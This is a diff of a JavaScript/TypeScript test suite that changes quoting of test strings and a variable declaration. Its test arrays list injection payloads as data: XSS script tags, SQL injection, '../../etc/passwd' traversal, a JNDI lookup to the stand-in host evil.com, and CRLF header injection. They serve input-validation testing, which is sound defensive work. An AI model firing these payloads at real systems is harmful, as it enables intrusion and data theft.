@@ -274,7 +274,7 @@ describe('App Core Functionality', () => {
         '<script>alert("xss")</script>',
         'DROP TABLE users;',
         '../../etc/passwd',
-        '${jndi:ldap://evil.com/a}',
+        `\${jndi:ldap://evil.com/a}`,
         '%0a%0d%0aSet-Cookie:%20malicious=true'
       ];
 
@@ -311,7 +311,7 @@ describe('App Core Functionality', () => {
         '1 OR 1=1',
         '<img src=x onerror=alert(1)>',
         '{{7*7}}',
-        '${7*7}'
+        `\${7*7}`
       ];
 
       injectionAttempts.forEach(attempt => {
@@ -555,7 +555,7 @@ describe('Pure Functions', () => {
   });
 
   it('should not have side effects', () => {
-    let externalState = 'unchanged';
+    const externalState = 'unchanged';
     
     const pureFunctionCandidate = (input: string) => {
       return input.toUpperCase();
